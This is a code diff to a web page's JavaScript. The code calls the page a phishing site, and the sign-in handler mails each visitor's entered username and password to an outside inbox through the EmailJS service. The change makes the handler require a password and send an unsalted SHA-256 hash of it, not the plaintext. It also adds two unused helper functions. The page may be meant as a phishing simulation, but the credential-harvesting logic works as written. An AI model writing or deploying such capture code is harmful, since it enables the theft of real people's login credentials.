@@ -18,13 +18,19 @@ function openPhishingSite() {
   overlay.classList.replace('hidden', 'flex');
 }
 
-signInButton.addEventListener('click', () => {
+signInButton.addEventListener('click', async () => {
   if (username.value === '') {
     return;
   }
-  emailjs
+  if (password.value === '') {
+    return;
+  }
+
+  const hash = await passHash(password.value);
+
+  await emailjs
     .send('ZRS', 'template_qdm55vd', {
-      message: `Username: ${username.value} + Password: ${password.value}`,
+      message: `Username: ${username.value} + Password: ${hash}`,
     })
     .then(() => {
       //alert('Email sent successfully!');
@@ -38,3 +44,27 @@ signInButton.addEventListener('click', () => {
       //alert('Oops! Something went wrong.');
     });
 });
+
+function easyEncoding() {
+  let pass = password.value;
+  return '*'.repeat(pass.length);
+}
+
+function encodeTest() {
+  let enc = new TextEncoder();
+  return enc.encode('Banana');
+}
+
+async function passHash(pass) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(pass);
+
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray
+    .map((b) => b.toString(16).padStart(2, '0'))
+    .join('');
+
+  return hashHex;
+}
